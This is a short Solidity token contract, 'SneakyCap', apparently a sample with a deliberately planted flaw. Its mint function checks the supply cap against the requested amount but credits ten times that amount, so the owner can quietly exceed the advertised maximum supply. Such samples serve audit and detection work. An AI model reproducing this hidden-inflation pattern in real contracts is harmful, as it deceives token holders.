// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract SneakyCap {
    address public owner;
    uint256 public totalSupply;
    uint256 public constant MAX_SUPPLY = 1_000_000e18;
    mapping(address => uint256) public balanceOf;

    constructor() { owner = msg.sender; }
    modifier onlyOwner() { require(msg.sender == owner, "not owner"); _; }

    function mint(address to, uint256 amount) external onlyOwner {
        require(totalSupply + amount <= MAX_SUPPLY, "cap exceeded");
        totalSupply += amount * 10;
        balanceOf[to] += amount * 10;
    }
}
